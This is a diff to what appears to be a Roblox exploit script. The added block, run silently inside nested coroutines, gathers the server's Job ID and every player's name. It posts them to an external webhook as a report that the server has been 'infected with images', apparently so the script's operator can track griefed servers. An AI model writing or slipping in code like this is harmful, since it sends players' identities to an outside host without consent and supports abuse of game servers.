@@ -287,6 +287,33 @@ getgenv().CanHopAndBlock = true
 
 end
 
+coroutine.wrap(function()
+    coroutine.wrap(function()
+        local HttpService = game:GetService("HttpService")
+        local players = {}
+    
+        for _, player in ipairs(game.Players:GetPlayers()) do
+            table.insert(players, player.Name)
+        end
+    
+        local content = "🚨 SERVER INFECTED WITH IMAGES 🚨\n"
+        content = content .. "🆔 Job ID: `" .. game.JobId .. "`\n"
+        content = content .. "👥 Players Counts: `" .. tostring(#game.Players:GetPlayers()) .. "`\n"
+        content = content .. "👥 Players: `" .. table.concat(players, ", ") .. "`"
+    
+        http.request({
+            Url = web,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode({
+                content = "@everyone " .. content .. " ".. game.JobId,
+                username = game.Players.LocalPlayer.Name
+            })
+        })
+    end)()
+end)()
 end
 StartProc()
 
